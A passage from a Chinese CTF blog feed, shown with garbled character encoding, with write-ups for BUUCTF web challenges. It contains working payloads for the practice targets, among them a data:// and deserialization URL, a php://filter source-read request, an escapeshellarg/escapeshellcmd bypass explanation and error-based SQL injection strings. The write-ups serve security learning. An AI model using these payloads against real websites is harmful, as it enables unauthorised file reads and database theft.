delimiter">&lt;?php</span>  <span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//flag.php  </span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token operator">=</span><span class="token string">'flag.php'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Flag</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"$a"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}</span><span class="token delimiter">?></span></code></pre><p>payload:</p><pre class=" language-bash"><code class="language-bash">http://89071de8-6fdf-46b3-877a-fc3da9efac70.node3.buuoj.cn/?text<span class="token operator">=</span>data://text/plain<span class="token punctuation">;</span>base64,d2VsY29tZSB0byB0aGUgempjdGY<span class="token operator">=</span><span class="token operator">&amp;</span>file<span class="token operator">=</span>useless.php<span class="token operator">&amp;</span>password<span class="token operator">=</span>O:4:<span class="token string">"Flag"</span>:1:<span class="token punctuation">{</span>s:4:<span class="token string">"file"</span><span class="token punctuation">;</span>s:8:<span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="/LawlietLW.github.io/2020/02/10/zjctf-2019-nizhuansiwei/3.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> dataä¼ªåè®® </tag>
            
            <tag> filterä¼ªåè®® </tag>
            
            <tag> PHPååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[BUUCTF 2018]Online Tool</title>
      <link href="/LawlietLW.github.io/2020/02/09/buuctf-2018-online-tool/"/>
      <url>/LawlietLW.github.io/2020/02/09/buuctf-2018-online-tool/</url>
      
        <content type="html"><![CDATA[<p>æ‰“å¼€ç¯å¢ƒ<br><a href="1.jpg"></a><br>ç›´æ¥ç»™å‡ºæºä»£ç ï¼Œä»£ç å®¡è®¡</p><a id="more"></a><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"glzjin"</span><span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'you are in sandbox '</span><span class="token punctuation">.</span><span class="token variable">$sandbox</span><span class="token punctuation">;</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span><span class="token punctuation">.</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p><code>_SERVER['HTTP_X_FORWARDED_FOR'],$_SERVER['REMOTE_ADDR']</code>ï¼ŒæŠŠç”¨æˆ·IPè®¾ç½®ä¸ºç”¨æˆ·çš„x_forwarded_for<br>ä¼ å…¥ä¸€ä¸ªhostå‚æ•°ï¼Œè¿ç»­å¯¹hostç”¨<code>escapeshellargå’Œescapeshellcmdå¤„ç†</code><br>è¿™ä¿©å‡½æ•°æ²¡è§è¿‡ï¼ŒæŸ¥ä¸€ä¸‹</p><pre class=" language-bash"><code class="language-bash">escapeshellarg<span class="token punctuation">(</span><span class="token punctuation">)</span> å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œå¹¶ä¸”è¿˜æ˜¯ç¡®ä¿å®‰å…¨çš„ã€‚å¯¹äºç”¨æˆ·è¾“å…¥çš„éƒ¨åˆ†å‚æ•°å°±åº”è¯¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°ã€‚shell å‡½æ•°åŒ…å« exec<span class="token punctuation">(</span><span class="token punctuation">)</span>, system<span class="token punctuation">(</span><span class="token punctuation">)</span> æ‰§è¡Œè¿ç®—ç¬¦ escapeshellcmd<span class="token punctuation">(</span><span class="token punctuation">)</span> å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ° exec<span class="token punctuation">(</span><span class="token punctuation">)</span> æˆ– system<span class="token punctuation">(</span><span class="token punctuation">)</span> å‡½æ•°ï¼Œæˆ–è€… æ‰§è¡Œæ“ä½œç¬¦ ä¹‹å‰è¿›è¡Œè½¬ä¹‰</code></pre><p>è¿™ä¸¤ä¸ªå‡½æ•°æ”¾åœ¨ä¸€èµ·è‚¯å®šä¼šé€ æˆæ¼æ´(ä¸ç„¶ä¸ºå•¥æ”¾åœ¨ç®€çŸ­çš„æºä»£ç é‡Œ)<br>æœç„¶å¯ä»¥æŸ¥åˆ°è¿™ä¸¤ä¸ªå‡½æ•°çš„æ¼æ´<br><a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">PHP escapeshellarg()+escapeshellcmd() ä¹‹æ®‡</a></p><pre class=" language-bash"><code class="language-bash">ä¼ å…¥çš„å‚æ•°æ˜¯ï¼š172.17.0.2<span class="token string">' -v -d a=1ç»è¿‡escapeshellargå¤„ç†åå˜æˆäº†'</span>172.17.0.2<span class="token string">'\''</span> -v -d a<span class="token operator">=</span>1<span class="token string">'ï¼Œå³å…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ã€‚ç»è¿‡escapeshellcmdå¤„ç†åå˜æˆ'</span>172.17.0.2<span class="token string">'\\'</span><span class="token string">' -v -d a=1\'ï¼Œè¿™æ˜¯å› ä¸ºescapeshellcmdå¯¹\ä»¥åŠæœ€åé‚£ä¸ªä¸é…å¯¹å„¿çš„å¼•å·è¿›è¡Œäº†è½¬ä¹‰ï¼šhttp://php.net/manual/zh/function.escapeshellcmd.phpæœ€åæ‰§è¡Œçš„å‘½ä»¤æ˜¯curl '</span>172.17.0.2<span class="token string">'\\'</span><span class="token string">' -v -d a=1\'ï¼Œç”±äºä¸­é—´çš„\\è¢«è§£é‡Šä¸º\è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥åé¢çš„'</span>æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œä¸å†åé¢çš„<span class="token string">'é…å¯¹å„¿æˆäº†ä¸€ä¸ªç©ºç™½è¿æ¥ç¬¦ã€‚æ‰€ä»¥å¯ä»¥ç®€åŒ–ä¸ºcurl 172.17.0.2\ -v -d a=1'</span>ï¼Œå³å‘172.17.0.2\å‘èµ·è¯·æ±‚ï¼ŒPOST æ•°æ®ä¸ºa<span class="token operator">=</span>1' å®ƒä»¬åœ¨é…åˆæ—¶å¹¶æ²¡æœ‰è€ƒè™‘åˆ°å•å¼•å·å¸¦æ¥çš„éšæ‚£                   </code></pre><p>å°±æ˜¯è¯´ä¸¤æ¬¡è½¬ä¹‰åå•å¼•å·å‡ºé—®é¢˜äº†<br>å†å¾€ä¸‹çœ‹ï¼Œsystemä¼šæ‰§è¡Œnmapçš„å‘½ä»¤ï¼Œæ‰«æ$hostæŒ‡å®šçš„æœºå™¨<br>å¾ˆæ˜¾ç„¶æˆ‘ä»¬éœ€è¦åˆ©ç”¨nmapæ¥åšäº›ä»€ä¹ˆ</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> ç»•è¿‡escapeshellarg()+escapeshellcmd() </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</title>
      <link href="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/"/>
      <url>/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/</url>
      
        <content type="html"><![CDATA[<p>æ‰“å¼€ç¯å¢ƒ<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/1.jpg" alt=""><br>æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°ä¸€ä¸ªé¡µé¢</p><a id="more"></a><p><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/2.jpg" alt=""><br>è·³è½¬è¿‡å»<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/3.jpg" alt=""><br>ç‚¹ä¸€ä¸‹secret<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/4.jpg" alt=""><br>çœ‹åˆ°è¿™ä¸ªé¡µé¢æœæ–­ä¸Šburp<br>å¾—åˆ°å¦ä¸€ä¸ªé¡µé¢<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/5.jpg" alt=""><br>è·³è½¬è¿‡å»å¾—åˆ°ä»£ç </p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string">"../"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string">"tp"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string">"input"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Oh no!"</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//flagæ”¾åœ¨äº†flag.phpé‡Œ</span><span class="token delimiter">?></span></code></pre><p>æ ¹æ®ç¨‹åºï¼Œæˆ‘ä»¬è¦ä¼ å…¥ä¸€ä¸ªfileå‚æ•°ä¸ºflag.php<br>ç„¶è€Œå´å›æ˜¾äº†è¿™ä¹ˆä¸€ä¸ªé¡µé¢<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/6.jpg" alt=""><br>æœ‰ç‚¹æ‡µ<br>burpä¸ŠæŸ¥çœ‹ä¸€ä¸‹<br>ä¹Ÿæ²¡æœ‰<br>çœ‹çœ‹æ§åˆ¶å°çš„å±æ€§æ˜¯ä¸æ˜¯è®¾ç½®æˆhiddenäº†<br>åŒæ ·ä¹Ÿæ²¡æœ‰<br>çœŸçš„æ°”ï¼Œåˆ°æœ€åä¸€æ­¥äº†å´æ‰¾ä¸åˆ°flag<br>å¥½ä¹…ä¹‹åæ‰æƒ³èµ·æ¥flag.phpï¼Œä¸€ä¸ªphpæ–‡ä»¶ï¼Œé‚£æˆ‘ä»¬å¯ä»¥è¯»å®ƒçš„æºç å•Š</p><pre class=" language-bash"><code class="language-bash">http://22795964-60ec-4bea-9b8c-6b944c4ea759.node3.buuoj.cn/secr3t.php?file<span class="token operator">=</span>php://filter/convert.base64-encode/resource<span class="token operator">=</span>flag.php </code></pre><p>æœç„¶ï¼Œè¿”å›äº†flag.phpçš„base64ç¼–ç ï¼Œéšåè§£ç å°±å¯ä»¥å¾—åˆ°flag<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/7.jpg" alt=""><br>å“ï¼Œè¯´åˆ°åº•è¿˜æ˜¯å¤ªèœï¼Œç»éªŒä¹Ÿå°‘</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> burp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[ç½‘é¼æ¯ 2018]Fakebook</title>
      <link href="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/"/>
      <url>/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/</url>
      
        <content type="html"><![CDATA[<p>æ‰“å¼€ç¯å¢ƒ<br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/1.jpg" alt=""><br>æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç™»é™†è¿›å»</p><a id="more"></a><p><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/2.jpg" alt=""><br>æŸ¥çœ‹é¡µé¢æºä»£ç <br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/3.jpg" alt=""><br>æœ‰ä¸€ä¸ª<code>view.php?no=1</code>çš„é¡µé¢ï¼Œçœ‹èµ·æ¥å¯ä»¥sqlæ³¨å…¥<br>åŠ ä¸ªå•å¼•å·æµ‹è¯•<br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/4.jpg" alt=""><br>æŠ¥é”™<br>é‚£ä¹ˆæŠ¥é”™æ³¨å…¥èµ°ä¸€æ³¢</p><pre class=" language-bash"><code class="language-bash">?no<span class="token operator">=</span>1 and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span><span class="token string">'~'</span>,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+?no<span class="token operator">=</span>1 and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span><span class="token string">'~'</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span><span class="token string">'fakebook'</span><span class="token punctuation">))</span>,1<span class="token punctuation">)</span>--+?no<span class="token operator">=</span>1 and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span><span class="token string">'~'</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where table_name<span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">))</span>,1<span class="token punctuation">)</span>--+?no<span class="token operator">=</span>1 and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span><span class="token string">'~'</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>data<span class="token punctuation">)</span> from users<span class="token punctuation">))</span>,1<span class="token punctuation">)</span>--+</code></pre><p><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/5.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/6.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/7.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/8.jpg" alt=""><br>å¯ä»¥çœ‹åˆ°ç”¨æˆ·ä¿¡æ¯çš„æ–¹å¼æ˜¯åºåˆ—åŒ–çš„<br>é‚£æ¥ä¸‹æ¥è¯¥æ€ä¹ˆåšï¼Œå¥½åƒæ²¡äº†çº¿ç´¢<br>emmmmmm<br>æ‰«ä¸€æ³¢ç›®å½•å§<br>æœç„¶æ‰«åˆ°äº†å¥½ä¸œè¥¿<br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/9.jpg" alt=""><br>ä¸‹è½½æ¥çœ‹çœ‹</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">UserInfo</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token variable">$age</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span> <span class="token operator">=</span> <span class="token variable">$blog</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$httpCode</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLINFO_HTTP_CODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$httpCode</span> <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token number">404</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getBlogContents</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">isValidBlog</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i"</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>å®¡è®¡ä»£ç <br>å®šä¹‰äº†ä¸€ä¸ªUserinfoç±»ï¼Œå±æ€§å°±æ˜¯æˆ‘ä»¬æ³¨å†Œæ—¶è¾“å…¥çš„é‚£äº›<br>å…¶ä¸­æœ‰ä¸€ä¸ªgetæ–¹æ³•ï¼Œæ¥å—ä¸€ä¸ªurlå‚æ•°</p><pre class=" language-bash"><code class="language-bash">resource curl_init <span class="token punctuation">(</span><span class="token punctuation">[</span> string <span class="token variable">$url</span> <span class="token operator">=</span> NULL <span class="token punctuation">]</span> <span class="token punctuation">)</span>åˆå§‹åŒ–ä¸€ä¸ªæ–°çš„ä¼šè¯ï¼Œè¿”å›ä¸€ä¸ªcURLå¥æŸ„ï¼Œä¾›curl_setopt<span class="token punctuation">(</span><span class="token punctuation">)</span>, curl_exec<span class="token punctuation">(</span><span class="token punctuation">)</span>å’Œcurl_close<span class="token punctuation">(</span><span class="token punctuation">)</span> å‡½æ•°ä½¿ç”¨urlå¦‚æœæä¾›äº†è¯¥å‚æ•°ï¼ŒCURLOPT_URL é€‰é¡¹å°†ä¼šè¢«è®¾ç½®æˆè¿™ä¸ªå€¼ã€‚ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨curl_setopt<span class="token punctuation">(</span><span class="token punctuation">)</span>å‡½æ•°æ‰‹åŠ¨åœ°è®¾ç½®è¿™ä¸ªå€¼</code></pre><p>å®ä¾‹</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// åˆ›å»ºä¸€ä¸ªæ–°cURLèµ„æº</span><span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// è®¾ç½®URLå’Œç›¸åº”çš„é€‰é¡¹</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> "http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.runoob.com/");</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// æŠ“å–URLå¹¶æŠŠå®ƒä¼ é€’ç»™æµè§ˆå™¨</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// å…³é—­cURLèµ„æºï¼Œå¹¶ä¸”é‡Šæ”¾ç³»ç»Ÿèµ„æº</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>æ‰€ä»¥getæ–¹æ³•å®è´¨ä¸Šå°±æ˜¯è¿”å›æˆ‘ä»¬è¯·æ±‚çš„urlçš„é¡µé¢<br>è€Œä¸‹é¢çš„çš„getBlogContentsæ–¹æ³•åˆ™æ˜¯è°ƒç”¨äº†getæ–¹æ³•æ¥è¯·æ±‚æˆ‘ä»¬è¾“å…¥çš„blog<br>å³å­˜åœ¨SSRFæ¼æ´<br>ç»“åˆæ•°æ®å­˜å‚¨çš„æ–¹å¼ï¼Œæˆ‘ä»¬çŒœæµ‹ç½‘ç«™æ˜¯é€šè¿‡è¯»å–ç”¨æˆ·blogå­—æ®µï¼Œä¹Ÿå°±æ˜¯urlå­—æ®µæ¥åŠ è½½çš„<br>è€Œåœ¨ä¹‹å‰çš„æŠ¥é”™æ³¨å…¥å½“ä¸­å·²ç»çˆ†å‡ºäº†ç½‘ç«™çš„ç»å¯¹è·¯å¾„<br>æˆ‘ä»¬å¯ä»¥æ„é€ blogå­—æ®µä¸ºflag.phpçš„ç»å¯¹è·¯å¾„æ¥è¯»å–flag</p><pre><code>libcurlç›®å‰æ”¯æŒhttpã€httpsã€ftpã€gopherã€telnetã€dictã€fileå’Œldapåè®®ã€‚libcurlåŒæ—¶ä¹Ÿæ”¯æŒHTTPSè®¤è¯ã€HTTP POSTã€HTTP PUTã€ FTP ä¸Šä¼ (è¿™ä¸ªä¹Ÿèƒ½é€šè¿‡PHPçš„FTPæ‰©å±•å®Œæˆ)ã€HTTP åŸºäºè¡¨å•çš„ä¸Šä¼ ã€ä»£ç†ã€cookieså’Œç”¨æˆ·å+å¯†ç çš„è®¤è¯ã€‚</code></pre><p>curlä¸ä»…æ”¯æŒhttpï¼Œhttpsåè®®ï¼Œè¿˜æ”¯æŒfileåè®®ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡fileåè®®æ¥è¯»å–flag.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token 